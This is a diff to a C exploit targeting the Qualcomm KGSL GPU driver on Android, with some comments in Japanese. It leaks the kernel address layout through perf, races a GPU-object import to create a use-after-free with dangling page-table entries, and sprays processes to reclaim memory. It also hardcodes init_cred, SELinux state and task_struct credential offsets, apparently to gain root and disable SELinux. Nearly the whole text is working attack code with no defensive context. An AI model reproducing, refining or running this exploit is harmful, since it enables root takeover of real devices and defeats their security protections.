@@ -69,22 +69,32 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 #define KGSL_CMDLIST_IB 0x00000001U
 #define KGSL_TIMESTAMP_RETIRED 0x00000002
 
-/* 32‑bit GPU でも mmap オフセットがオーバーフローしないよう、サイズは小さめに */
-#define UAF_SIZE       0x1000000ULL       /* 16 MB */
+/* ===== 修正アドレス（AVCバイパス実績範囲） ===== */
+#define UAF_ADDR       0x10000000ULL
+#define UAF_SIZE       0x1000000ULL          // 16MB
+#define OVERLAP_ADDR   0x10FFE000ULL
 #define OVERLAP_SIZE   0x7000ULL
-#define PLACEHOLDER_SIZE 0x10400000ULL    /* 16MB+256KB */
+#define BOGUS_ADDR     0x11000000ULL
+#define BOGUS_SIZE     0xffffffffffefd000ULL
+#define PLACEHOLDER_ADDR 0x12000000ULL
+#define PLACEHOLDER_SIZE 0x10400000ULL       // 16MB+256KB
 
-/* これらの固定アドレスは MAP_FIXED を使わないので、実際のマップアドレスは動的に取得する */
-#define BOGUS_SIZE     0xffffffffffefd000ULL  /* import で使うダミーサイズ */
+// vmlinux symbols (pre-KASLR)
+#define VMLINUX_TEXT      0xffffffc010080000ULL
+#define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
+#define VMLINUX_SELINUX_STATE 0xffffffc0123a4000ULL
+#define VMLINUX_SELINUX_ENFORCING_BOOT 0xffffffc01240744cULL
+
+// task_struct cred offset (pahole: cred at 1856=0x740)
+#define CRED_OFF    0x740
+#define REAL_CRED_OFF 0x738
+
+#define SPRAY_PIDS 2000
+#define SCAN_DWORDS 560
 
 static int kgsl_fd = -1;
 static volatile int race_done = 0;
 static volatile int dc_civac_works = -1;
-
-static uint64_t uaf_addr = 0;
-static uint64_t overlap_addr = 0;
-static uint64_t placeholder_addr = 0;
-static uint64_t bogus_addr = 0;
 
 static void sigill_handler(int sig) { dc_civac_works = 0; }
 
@@ -123,7 +133,10 @@ static uint64_t detect_kaslr(void) {
     pe.exclude_kernel = 0; pe.exclude_hv = 1; pe.exclude_user = 1;
 
     int fd = perf_open(&pe, 0, -1, -1, 0);
-    if (fd < 0) { printf("  perf_open: errno=%d (ignored)\n", errno); return 0; }
+    if (fd < 0) {
+        printf("  perf_open: errno=%d (ignored)\n", errno);
+        return 0;
+    }
 
     int npages = 256;
     size_t mmap_size = (1 + npages) * 4096;
@@ -162,8 +175,6 @@ static uint64_t detect_kaslr(void) {
 
     if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
 
-    #define VMLINUX_TEXT      0xffffffc010080000ULL
-    #define VMLINUX_INIT_CRED 0xffffffc012197d08ULL
     uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
     uint64_t ic_addr = VMLINUX_INIT_CRED + kaslr;
     printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
@@ -177,8 +188,20 @@ static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
     return a.id;
 }
 
+static void *gpuobj_mmap_fixed(int fd, size_t size, unsigned int id, void *addr) {
+    /* オフセットを 64bit で計算してから off_t にキャスト（オーバーフロー防止） */
+    off_t offset = (off_t)((uint64_t)id << 12);
+    void *p = mmap(addr, size, PROT_READ|PROT_WRITE,
+                   MAP_SHARED|MAP_FIXED, fd, offset);
+    if (p == MAP_FAILED) {
+        fprintf(stderr, "[!] mmap failed: addr=%p size=0x%lx offset=0x%lx id=%u errno=%d (%s)\n",
+                addr, (unsigned long)size, (unsigned long)offset, id, errno, strerror(errno));
+        exit(1);
+    }
+    return p;
+}
+
 static void *gpuobj_mmap(int fd, size_t size, unsigned int id) {
-    /* オフセットは id << PAGE_SHIFT だが、32bit オーバーフロー対策に uint64_t 経由でキャスト */
     off_t offset = (off_t)((uint64_t)id << 12);
     void *p = mmap(NULL, size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, offset);
     if (p == MAP_FAILED) die("gpuobj_mmap");
@@ -251,7 +274,7 @@ static int submit_ib(int fd, unsigned int ctx_id, uint64_t ib_gpuaddr,
 }
 
 static void *race_thread(void *arg) {
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = bogus_addr };
+    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
     struct kgsl_gpuobj_import imp = {
         .priv = (uint64_t)&uaddr, .priv_len = BOGUS_SIZE,
         .flags = KGSL_MEMFLAGS_USE_CPU_MAP, .type = KGSL_USER_MEM_TYPE_ADDR,
@@ -267,13 +290,7 @@ int main(int argc, char **argv) {
     if (kgsl_fd < 0) die("open kgsl");
     printf("[+] kgsl fd=%d\n", kgsl_fd);
 
-    /* 固定アドレスを使わず、まずはダミー用の bogus ページをマップ */
-    bogus_addr = (uint64_t)mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
-                                MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
-    if (bogus_addr == (uint64_t)MAP_FAILED) die("mmap bogus");
-    printf("[+] bogus_addr=0x%lx\n", (unsigned long)bogus_addr);
-
-    // KASLR detection (optional, may fail)
+    // Phase 0: KASLR detection (optional, failure is OK)
     printf("[*] Phase 0: Early KASLR detection\n");
     uint64_t init_cred_addr = detect_kaslr();
     printf("  init_cred=0x%lX\n", init_cred_addr);
@@ -284,34 +301,37 @@ int main(int argc, char **argv) {
     uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
     printf("  Using alloc_flags=0x%lx (WRITEBACK cache mode)\n", (unsigned long)alloc_flags);
     int uaf_id = gpuobj_alloc(kgsl_fd, UAF_SIZE, alloc_flags);
-    void *uaf_m = gpuobj_mmap(kgsl_fd, UAF_SIZE, uaf_id);
-    uaf_addr = (uint64_t)uaf_m;
-    printf("[+] UAF mapped at 0x%lx\n", (unsigned long)uaf_addr);
-    // UAF を一度マップしてからすぐにアンマップ（後で free する）
+    void *uaf_m = gpuobj_mmap_fixed(kgsl_fd, UAF_SIZE, uaf_id, (void*)UAF_ADDR);
+    printf("[+] UAF mapped at %p\n", uaf_m);
     munmap(uaf_m, UAF_SIZE);
 
+    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED)
+        die("mmap BOGUS");
+
     int ph_id = gpuobj_alloc(kgsl_fd, PLACEHOLDER_SIZE, alloc_flags);
-    void *ph_m = gpuobj_mmap(kgsl_fd, PLACEHOLDER_SIZE, ph_id);
-    placeholder_addr = (uint64_t)ph_m;
-    printf("[+] PLACEHOLDER mapped at 0x%lx\n", (unsigned long)placeholder_addr);
+    void *ph_m = gpuobj_mmap_fixed(kgsl_fd, PLACEHOLDER_SIZE, ph_id, (void*)PLACEHOLDER_ADDR);
+    printf("[+] PLACEHOLDER mapped at %p\n", ph_m);
+
+    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
+        (unsigned long)PLACEHOLDER_ADDR);
 
     // ===== Phase 2: Race =====
     printf("[*] Phase 2: Race\n");
 
     int ov_id = gpuobj_alloc(kgsl_fd, OVERLAP_SIZE, alloc_flags);
-    void *ov_m = gpuobj_mmap(kgsl_fd, OVERLAP_SIZE, ov_id);
-    overlap_addr = (uint64_t)ov_m;
-    printf("[+] OVERLAP mapped at 0x%lx\n", (unsigned long)overlap_addr);
+    void *ov_m = gpuobj_mmap_fixed(kgsl_fd, OVERLAP_SIZE, ov_id, (void*)OVERLAP_ADDR);
+    printf("[+] OVERLAP mapped at %p\n", ov_m);
 
     pthread_t thr;
     if (pthread_create(&thr, NULL, race_thread, NULL) != 0) die("pthread");
 
     int hit = 0;
     for (int i = 0; i < 5000000; i++) {
-        /* 競合のために OVERLAP 領域を再度マップ（MAP_FIXED は使わない） */
-        void *r = mmap((void*)overlap_addr, OVERLAP_SIZE,
-                       PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-                       kgsl_fd, (off_t)((uint64_t)ov_id << 12));
+        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
+            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
+            kgsl_fd, (off_t)((uint64_t)ov_id << 12));
         int e = errno;
         if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
         if (e == ENODEV) { hit = 1; break; }
@@ -327,8 +347,7 @@ int main(int argc, char **argv) {
     // ===== Phase 3: Free UAF =====
     printf("[*] Phase 3: Free UAF\n");
     gpuobj_free(kgsl_fd, uaf_id);
-    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n",
-        (unsigned long)(uaf_addr + 0x1000));
+    printf("[+] UAF freed (dangling PTEs at 0x%lx+)\n", (unsigned long)(UAF_ADDR + 0x1000));
 
     // ===== Phase 4: Reclaim =====
     printf("[*] Phase 4: Reclaim pages\n");
@@ -345,7 +364,6 @@ int main(int argc, char **argv) {
     fcntl(notify_pipe[0], F_SETFD, FD_CLOEXEC);
     fcntl(notify_pipe[1], F_SETFD, FD_CLOEXEC);
 
-    #define SPRAY_PIDS 2000
     pid_t spray_pids[SPRAY_PIDS];
     int n_spray = 0;
     for (int i = 0; i < SPRAY_PIDS; i++) {
@@ -446,9 +464,8 @@ int main(int argc, char **argv) {
         (unsigned long)dst_ga, (unsigned long)dst_flags,
         (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));
 
-    #define SCAN_DWORDS 560
-    uint64_t scan_start = uaf_addr + 0x300000;
-    uint64_t end_va = uaf_addr + UAF_SIZE - 0x1000;
+    uint64_t scan_start = UAF_ADDR + 0x300000;
+    uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
     printf("  Scanning [0x%lx - 0x%lx]...\n",
         (unsigned long)scan_start, (unsigned long)end_va);
 
